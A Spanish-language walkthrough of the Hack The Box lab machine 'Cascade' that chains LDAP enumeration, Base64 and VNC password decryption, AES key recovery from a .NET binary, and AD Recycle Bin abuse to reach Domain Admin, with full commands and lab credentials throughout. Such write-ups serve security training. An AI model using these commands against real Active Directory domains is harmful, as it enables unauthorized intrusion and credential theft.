CASCADE

HTB WINDOWS MEDIUM ACTIVE DIRECTORY REVERSING

Guía de Cascade, la #6 de la serie y la primera Medium. El salto de dificultad no es que un paso sea más duro: es que hay muchos más pasos, y hay que mantener el hilo. Ocho eslabones encadenados, cada uno con una técnica que Forest y Sauna no tenían: enumeración LDAP profunda, Base64, descifrado de VNC, reversing de un binario .NET con AES, y la papelera de reciclaje de Active Directory.

VPN: Machines (la normal). El flujo de conexión y el /etc/hosts son los de Forest (ver 00 · Setup). En esta guía la IP es 10.129.62.222, el dominio cascade.local y el DC CASC-DC1.

01 · RECONOCIMIENTO

Un DC como Forest, pero sin web: la lista de usuarios sale de LDAP/SMB.
nmap -p- --min-rate 1000 -oA nmap/allports 10.129.62.222
nmap -sCV -p 53,88,135,139,389,445,636,3268,3269,5985 -oA nmap/detail 10.129.62.222

ttl=127 sugiere Windows (a confirmar). Huella de Domain Controller (Kerberos 88, LDAP 389/636, SMB 445, WinRM 5985), Windows Server 2008 R2 (un DC viejo). Dominio cascade.local, host CASC-DC1. A diferencia de Sauna, no hay puerto 80: sin web, la lista de usuarios saldrá de LDAP o SMB.

sudo sh -c 'echo "10.129.62.222 cascade.local CASC-DC1.cascade.local CASC-DC1" >> /etc/hosts'
ERROR CLÁSICO: Name or service not knownSi GetNPUsers u otra herramienta Kerberos falla con Name or service not known (CASCADE.LOCAL:88), no es que el ataque falle: es que falta el /etc/hosts. Kerberos habla por nombre, no por IP. Configúralo justo después de sacar el dominio.

02 · ENUMERACIÓN LDAP

La primera credencial está escondida en un atributo del directorio.

Usuarios (SMB) y AS-REP (falla)

netexec smb 10.129.62.222 -u '' -p '' --users   # SÍ da 15 usuarios (a diferencia de Sauna)
impacket-GetNPUsers cascade.local/ -no-pass -usersfile users.txt   # ningún usuario roasteable

Medium no regala la entrada: el AS-REP Roasting de Forest/Sauna aquí no da nada. Hay que escarbar más.

▚ Atributos de LDAP: donde se esconden secretos

Cada usuario de AD es un objeto con decenas de atributos (campos). Los administradores a veces dejan información sensible en campos poco visibles, incluso personalizados. Volcar todo LDAP y buscar en él es una técnica central de AD.

Volcar y buscar

ldapsearch -x -H ldap://10.129.62.222 -b "DC=cascade,DC=local" > ldap_dump.txt
grep -i "pwd\|pass\|legacy" ldap_dump.txt

En el objeto de Ryan Thompson aparece un atributo no estándar:

# Ryan Thompson, Users, UK, cascade.local
userPrincipalName: r.thompson@cascade.local
cascadeLegacyPwd: clk0bjVldmE=
BASE64 NO ES CIFRADOEse clk0bjVldmE= (con = al final) es Base64: no se crackea, se decodifica, y es instantáneo. Distinto de un hash. Reconocer el patrón ahorra tiempo.
echo 'clk0bjVldmE=' | base64 -d   # -> rY4n5eva

Credenciales: r.thompson / rY4n5eva.

04 · DESCIFRAR VNC → s.smith

VNC cifra con una clave fija y pública: se revierte.

▚ La contraseña de VNC

El VNC Install.reg tiene "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f. VNC "cifra" su contraseña con una clave DES fija y universal (la misma en todas las instalaciones), así que se descifra trivialmente.

echo -n '6bcf2a4b6e5aca0f' | xxd -r -p > vnc.bin
python3 -c "from Crypto.Cipher import DES
d=open('vnc.bin','rb').read()
k=b'\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0'
print(DES.new(k,DES.MODE_ECB).decrypt(d))"   # -> sT333ve2

Esa clave DES (e84ad660c4721ae0) es la universal de VNC. Contraseña de s.smith / sT333ve2.

Foothold y user flag

s.smith SÍ tiene WinRM (está en Remote Management Users):

netexec winrm 10.129.62.222 -u s.smith -p sT333ve2   # (Pwn3d!)
evil-winrm -i 10.129.62.222 -u s.smith -p sT333ve2
type C:\Users\s.smith\Desktop\user.txt   # user flag
DATO DE ENUMERACIÓN: EL LOGON SCRIPTEl "script que corre al iniciar sesión" un usuario no es un archivo cualquiera: es el atributo scriptPath de su cuenta. Se ve con Get-ADUser s.smith -Properties scriptPath (aquí: MapAuditDrive.vbs), no con el .bat que haya por el share.

05 · AUDIT$ + REVERSING → arksvc

La parte más Medium: una contraseña cifrada con AES y la clave en un binario.

s.smith pertenece al grupo Audit Share, que le abre un share que r.thompson no veía. Dentro está el paquete del "Ark Audit":

smbclient '//10.129.62.222/Audit$' -U 'cascade.local/s.smith%sT333ve2'
# CascAudit.exe (.NET) · CascCrypto.dll · DB\Audit.db (SQLite) · RunAudit.bat

La base de datos

sqlite3 Audit.db
sqlite> .tables            # DeletedUserAudit  Ldap  Misc
sqlite> SELECT * FROM Ldap;
# ArkSvc | BQO5l5Kj9MdErXx6Q6AGOw== | cascade.local
ESTO NO ES SOLO BASE64El BQO5l5Kj9MdErXx6Q6AGOw== parece Base64 por el =, pero está cifrado con AES y luego codificado. Decodificarlo con base64 -d solo da bytes basura: hay que descifrarlo con la clave correcta.

▚ Reversing de un binario .NET

La clave AES y el IV están incrustados en CascAudit.exe / CascCrypto.dll. Los binarios .NET se descompilan para leer su código casi original. La herramienta ideal es dnSpy (o ILSpy) en Windows, que muestra la llamada a DecryptString(pwd, "clave") y el DefaultIV. En Kali los descompiladores (ilspycmd, monodis) pueden fallar: ten dnSpy a mano.

Del binario se obtiene: clave c4scadek3y654321, IV 1tdyjCbY1Ix49842, modo AES-CBC. Con eso se descifra:

python3 -c "from Crypto.Cipher import AES; import base64; \
e=base64.b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='); \
print(AES.new(b'c4scadek3y654321',AES.MODE_CBC,b'1tdyjCbY1Ix49842').decrypt(e))"
# -> b'w3lc0meFr31nd\x03\x03\x03'  (el \x03 es padding PKCS7)

Contraseña de arksvc / w3lc0meFr31nd. Lección: hardcodear claves en binarios es reversible.

06 · AD RECYCLE BIN → ROOT

Los objetos borrados de AD conservan sus atributos, incluida la contraseña.

▚ La papelera de reciclaje de Active Directory

Al borrar un objeto en AD, no desaparece: va a un contenedor de "Deleted Objects" y conserva sus atributos. Los miembros del grupo AD Recycle Bin pueden consultarlos. Y arksvc pertenece a ese grupo (visto en el LDAP). Recordando el email: TempAdmin (borrado) tenía la contraseña del Administrator.

Recuperar TempAdmin

evil-winrm -i 10.129.62.222 -u arksvc -p w3lc0meFr31nd
PS> Get-ADObject -filter 'isDeleted -eq $true -and Name -like "*TempAdmin*"' -includeDeletedObjects -Properties *
# cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz

Otra vez cascadeLegacyPwd, otra vez Base64. Se decodifica, y es la contraseña de Administrator:

echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d   # -> baCT3r1aN00dles

Domain Admin

evil-winrm -i 10.129.62.222 -u Administrator -p 'baCT3r1aN00dles'
type C:\Users\Administrator\Desktop\root.txt   # root flag

Domain Admin. Cascade comprometida por completo.

r.thompson ─(LDAP)→ s.smith ─(VNC)→ arksvc ─(AES/reversing)→ AD Recycle Bin ─(TempAdmin)→ Administrator

EL SALTO A MEDIUM

No un paso más duro: muchos más pasos, y mantener el hilo.
SMB users → LDAP legacyPwd → share Data → VNC decrypt → .NET/AES → AD Recycle Bin → DA

GENERAL principio transferible a otras máquinas. LAB heurística o convención de laboratorio (HTB), no una regla universal.

  • GENERALEnumeración LDAP profunda: ldapsearch anónimo vuelca todos los atributos; secretos como cascadeLegacyPwd viven ahí.
  • GENERALBase64 ≠ cifrado: el = al final delata Base64; se decodifica (instantáneo), no se crackea.
  • GENERALShare hunting: --shares + smbclient recurse ON para peinar carpetas en busca de configs, emails y logs.
  • GENERALDescifrado de VNC: la contraseña de VNC usa una clave DES fija y pública; se revierte siempre.
  • GENERALReversing .NET: claves AES/IV hardcodeadas en un binario se leen con dnSpy/ILSpy y permiten descifrar secretos.
  • GENERALSQLite: sqlite3 para leer bases de datos de aplicaciones que dejan credenciales.
  • GENERALAD Recycle Bin: el grupo permite leer atributos de objetos borrados; recuperar una cuenta eliminada puede revelar su contraseña.
  • GENERALEncadenar credenciales: cada usuario desbloquea al siguiente (r.thompson → s.smith → arksvc → Administrator).
  • LAB/etc/hosts para resolver nombres: Name or service not known en Kerberos = falta el mapeo del dominio (habitual en labs), no un ataque fallido.
  • LABBloodHound CE vs legacy: si el zip no carga, usa bloodhound-ce-python para generar el formato correcto.
